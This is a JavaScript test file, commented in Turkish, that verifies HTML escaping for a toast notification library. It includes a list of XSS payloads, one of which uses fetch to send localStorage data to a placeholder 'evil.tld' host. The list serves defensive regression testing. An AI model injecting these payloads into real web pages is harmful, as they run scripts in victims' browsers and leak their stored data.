// DÜRTÜ — XSS / girdi sanitizasyonu testleri (BLOCKER #8).
// Toast'lar dangerouslySetInnerHTML ile basıldığı için escape katmanı
// güvenlik sınırıdır; regresyonu sessizce geri gelmemeli.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { escapeHtml, html, fmt } from '../lib/toast.js';

const PAYLOADS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '"><svg/onload=alert(1)>',
  "'><iframe src=javascript:alert(1)>",
  '<a href="javascript:alert(1)">tıkla</a>',
  '</b><script>fetch("//evil.tld?c="+localStorage.chips)</script>',
];

test('escapeHtml: tüm XSS payload\'larında yürütülebilir etiket kalmaz', () => {
  for (const p of PAYLOADS) {
    const out = escapeHtml(p);
    assert.ok(!out.includes('<'), `< kaçmadı: ${out}`);
    assert.ok(!out.includes('>'), `> kaçmadı: ${out}`);
    assert.ok(!/<script/i.test(out));
  }
});

test('escapeHtml: beş özel karakterin tamamını kaçırır', () => {
  assert.equal(escapeHtml('&<>"\''), '&amp;&lt;&gt;&quot;&#39;');
});

test('escapeHtml: & karakteri çift kaçırma sırası doğru', () => {
  // Önce & kaçmazsa &lt; → &amp;lt; bozulması olur.
  assert.equal(escapeHtml('&lt;'), '&amp;lt;');
});

test('escapeHtml: null/undefined boş string döner, çökmez', () => {
  assert.equal(escapeHtml(null), '');
  assert.equal(escapeHtml(undefined), '');
  assert.equal(escapeHtml(0), '0');
});

test('html: literal markup korunur, interpolasyon escape edilir', () => {
  const kotuIsim = '<img src=x onerror=alert(1)>';
  const out = html`<b>Hoş geldin, ${kotuIsim}.</b>`;
  assert.ok(out.startsWith('<b>'), 'literal etiketler korunmalı');
  assert.ok(out.endsWith('.</b>'));
  assert.ok(!out.includes('<img'), 'kullanıcı girdisi HTML olarak geçmemeli');
  assert.ok(out.includes('&lt;img'));
});

test('html: birden çok değer ve sayı interpolasyonu', () => {
  const out = html`<b>${'<i>a</i>'}</b> ${42} ${'<u>b</u>'}`;
  assert.ok(!out.includes('<i>') && !out.includes('<u>'));
  assert.ok(out.includes('42'));
});

test('html: değersiz template olduğu gibi döner', () => {
  assert.equal(html`<b>sabit</b>`, '<b>sabit</b>');
});

test('fmt: NaN/Infinity kullanıcıya "NaN" göstermez', () => {
  for (const v of [NaN, Infinity, -Infinity, undefined, null, 'abc', {}]) {
    assert.equal(fmt(v), '0', `${String(v)} → ${fmt(v)}`);
  }
});

test('fmt: geçerli sayılar yerel biçimde döner', () => {
  assert.equal(fmt(1000).replace(/\s/g, ''), (1000).toLocaleString('tr-TR').replace(/\s/g, ''));
  assert.equal(fmt(0), '0');
});
